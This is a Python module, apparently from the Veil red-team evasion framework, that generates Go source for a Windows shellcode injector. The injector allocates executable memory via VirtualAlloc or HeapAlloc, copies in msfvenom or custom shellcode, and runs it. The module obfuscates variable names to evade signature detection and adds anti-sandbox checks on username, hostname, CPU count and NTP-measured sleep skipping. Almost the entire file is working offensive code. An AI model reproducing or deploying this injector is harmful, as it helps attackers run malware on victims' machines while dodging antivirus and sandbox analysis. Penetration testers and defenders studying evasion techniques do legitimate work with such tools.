"""

Go inline shellcode injector using the VirtualAlloc().
Uses basic variable renaming obfuscation.


Module built by @b00stfr3ak44
Updated by @ChrisTruncer

"""

from Tools.Evasion.evasion_common import evasion_helpers
from Tools.Evasion.evasion_common import shellcode_help


class PayloadModule:

    def __init__(self, cli_obj):
        # required
        self.language = "go"
        self.extension = "go"
        self.rating = "Normal"
        self.description = "Golang VirtualAlloc method for inline shellcode injection"
        self.name = "Golang Flat Shellcode Injector"
        self.path = "go/shellcode_inject/virtual"
        self.cli_opts = cli_obj
        self.shellcode = shellcode_help.Shellcode(cli_obj)
        self.payload_source_code = ''
        if cli_obj.ordnance_payload is not None:
            self.payload_type = cli_obj.ordnance_payload
        elif cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ''
        self.cli_shellcode = False

        # options we require user interaction for- format is {OPTION : [Value, Description]]}
        self.required_options = {
            "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
            "INJECT_METHOD"  : ["Virtual", "Virtual or Heap"],
            "HOSTNAME"       : ["X", "Optional: Required system hostname"],
            "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
            "USERNAME"       : ["X", "Optional: The required user account"],
            "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
        }

    def system_checks(self):
        rand_username = evasion_helpers.randomString()
        rand_error1 = evasion_helpers.randomString()
        rand_hostname = evasion_helpers.randomString()
        rand_error2 = evasion_helpers.randomString()
        rand_processor = evasion_helpers.randomString()
        rand_domain = evasion_helpers.randomString()
        rand_error3 = evasion_helpers.randomString()
        num_ends = 0
        check_code = ''

        if self.required_options["USERNAME"][0].lower() != "x":
            check_code += rand_username + ", " + rand_error1 + " := user.Current()\n"
            check_code += "if " + rand_error1 + " != nil {\n"
            check_code += "os.Exit(1)}\n"
            check_code += "if strings.Contains(strings.ToLower(" + rand_username + ".Username), strings.ToLower(\"" + self.required_options["USERNAME"][0] + "\")) {\n"
            num_ends += 1

        if self.required_options["HOSTNAME"][0].lower() != "x":
            check_code += rand_hostname + ", " + rand_error2 + " := os.Hostname()\n"
            check_code += "if " + rand_error2 + " != nil {\n"
            check_code += "os.Exit(1)}\n"
            check_code += "if strings.Contains(strings.ToLower(" + rand_hostname + "), strings.ToLower(\"" + self.required_options["HOSTNAME"][0] + "\")) {\n"
            num_ends += 1

        if self.required_options["PROCESSORS"][0].lower() != "x":
            check_code += rand_processor + " := runtime.NumCPU()\n"
            check_code += "if " + rand_processor + " >= " + self.required_options["PROCESSORS"][0] + " {\n"
            num_ends += 1

        if self.required_options["SLEEP"][0].lower() != "x":
            check_code += 'type ntp_struct struct {FirstByte,A,B,C uint8;D,E,F uint32;G,H uint64;ReceiveTime uint64;J uint64}\n'
            check_code += 'sock,_ := net.Dial("udp", "us.pool.ntp.org:123");sock.SetDeadline(time.Now().Add((6*time.Second)));defer sock.Close()\n'
            check_code += 'ntp_transmit := new(ntp_struct);ntp_transmit.FirstByte=0x1b\n'
            check_code += 'binary.Write(sock, binary.BigEndian, ntp_transmit);binary.Read(sock, binary.BigEndian, ntp_transmit)\n'
            check_code += 'val := time.Date(1900, 1, 1, 0, 0, 0, 0, time.UTC).Add(time.Duration(((ntp_transmit.ReceiveTime >> 32)*1000000000)))\n'
            check_code += 'time.Sleep(time.Duration(' + self.required_options["SLEEP"][0] + '*1000) * time.Millisecond)\n'
            check_code += 'newsock,_ := net.Dial("udp", "us.pool.ntp.org:123");newsock.SetDeadline(time.Now().Add((6*time.Second)));defer newsock.Close()\n'
            check_code += 'second_transmit := new(ntp_struct);second_transmit.FirstByte=0x1b\n'
            check_code += 'binary.Write(newsock, binary.BigEndian, second_transmit);binary.Read(newsock, binary.BigEndian, second_transmit)\n'
            check_code += 'if int(time.Date(1900, 1, 1, 0, 0, 0, 0, time.UTC).Add(time.Duration(((second_transmit.ReceiveTime >> 32)*1000000000))).Sub(val).Seconds()) >= ' + self.required_options["SLEEP"][0] + ' {'
            num_ends += 1

        return check_code, num_ends

    def generate(self):

        # randomly generate out variable names
        memCommit = evasion_helpers.randomString()
        memReserve = evasion_helpers.randomString()
        pageExecRW = evasion_helpers.randomString()
        kernel32 = evasion_helpers.randomString()
        procVirtualAlloc = evasion_helpers.randomString()
        cust_func = evasion_helpers.randomString()
        size = evasion_helpers.randomString()
        addr = evasion_helpers.randomString()
        err = evasion_helpers.randomString()
        shellcode_variable = evasion_helpers.randomString()
        buff = evasion_helpers.randomString()
        value = evasion_helpers.randomString()
        heapcreatevariable = evasion_helpers.randomString()
        heapallocvariable = evasion_helpers.randomString()
        heapcreateout = evasion_helpers.randomString()
        errorvariable = evasion_helpers.randomString()
        heapallocout = evasion_helpers.randomString()
        errorvariabledos = evasion_helpers.randomString()
        rand_var = evasion_helpers.randomString()

        # Generate the shellcode
        if not self.cli_shellcode:
            Shellcode = self.shellcode.generate(self.cli_opts)
            if self.shellcode.msfvenompayload:
                self.payload_type = self.shellcode.msfvenompayload
            elif self.shellcode.payload_choice:
                self.payload_type = self.shellcode.payload_choice
                self.shellcode.payload_choice = ''
            # assume custom shellcode
            else:
                self.payload_type = 'custom'
        else:
            Shellcode = self.cli_shellcode

        # sandbox check code
        sandbox_checks, num_curlys = self.system_checks()

        payload_code = "package main\nimport (\n\"syscall\"\n\"unsafe\"\n\"fmt\"\n\"os\"\n"
        if self.required_options["PROCESSORS"][0].lower() != "x":
            payload_code += "\"runtime\"\n"

        # Add in other imports based on checks being performed
        if self.required_options["USERNAME"][0].lower() != "x":
            payload_code += "\"strings\"\n\"os\"\n\"os/user\"\n"
        if self.required_options["HOSTNAME"][0].lower() != "x":
            if "strings" not in payload_code:
                payload_code += "\"strings\"\n"
            if "os" not in payload_code:
                payload_code += "\"os\"\n"

        payload_code += ")\n"

        # Changes based on injection type
        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            payload_code += "const (\n"
            payload_code += "%s  = 0x1000\n" % (memCommit)
            payload_code += "%s = 0x2000\n" % (memReserve)
            payload_code += "%s  = 0x40\n)\n" % (pageExecRW)

        payload_code += "var (\n"

        # injection type
        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            payload_code += "%s = syscall.NewLazyDLL(\"kernel32.dll\")\n" %(kernel32)
            payload_code += "%s = %s.NewProc(\"VirtualAlloc\")\n)\n" %(procVirtualAlloc, kernel32)
            payload_code += "func %s(%s uintptr) (uintptr, error) {\n" %(cust_func, size)
            payload_code += "%s, _, %s := %s.Call(0, %s, %s|%s, %s)\n" %(addr, err, procVirtualAlloc, size, memReserve, memCommit, pageExecRW)
            payload_code += "if %s == 0 {\nreturn 0, %s\n}\nreturn %s, nil\n}\n" %(addr, err, addr)

        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
            payload_code += kernel32 + " = syscall.NewLazyDLL(\"kernel32.dll\")\n"
            payload_code += heapcreatevariable + " = " + kernel32 + ".NewProc(\"HeapCreate\")\n"
            payload_code += heapallocvariable + " = " + kernel32 + ".NewProc(\"HeapAlloc\")\n)\n"
            payload_code += "func %s(%s uintptr) (uintptr, error) {\n" %(cust_func, size)
            payload_code += heapcreateout + ", _, " + errorvariable + " := " + heapcreatevariable + ".Call(0x00040000, " + size + ", 0)\n"
            payload_code += heapallocout + ", _, _ := " + heapallocvariable + ".Call(" + heapcreateout + ", 0x00000008, " + size + ")\n"
            payload_code += "if %s == 0 {\nreturn 0, %s\n}\nreturn %s, nil\n}\n" %(heapallocout, errorvariable, heapallocout)

        payload_code += "var %s string = \"%s\"\n" %(shellcode_variable, Shellcode)
        payload_code += "func main() {\n"
        # Sandbox code goes here
        if sandbox_checks != '':
            payload_code += sandbox_checks

        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            payload_code += "%s, %s := %s(uintptr(len(%s)))\n" %(addr, err, cust_func, shellcode_variable)
        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
            payload_code += "%s, %s := %s(uintptr(len(%s)))\n" %(heapallocout, err, cust_func, shellcode_variable)

        payload_code += "if %s != nil {\nfmt.Println(%s)\nos.Exit(1)\n}\n" %(err, err)
        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            payload_code += "%s := (*[890000]byte)(unsafe.Pointer(%s))\n" %(buff, addr)
        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
            payload_code += "%s := (*[890000]byte)(unsafe.Pointer(%s))\n" %(buff, heapallocout)
        payload_code += "for " + rand_var + ", %s := range []byte(%s) {\n" %(value, shellcode_variable)
        payload_code += buff + "[" + rand_var + "] = %s\n}\n" % (value)
        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            payload_code += "syscall.Syscall(%s, 0, 0, 0, 0)\n}\n" % (addr)
        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
            payload_code += "syscall.Syscall(%s, 0, 0, 0, 0)\n}\n" % (heapallocout)

        payload_code += '}' * num_curlys
        self.payload_source_code = payload_code
        return
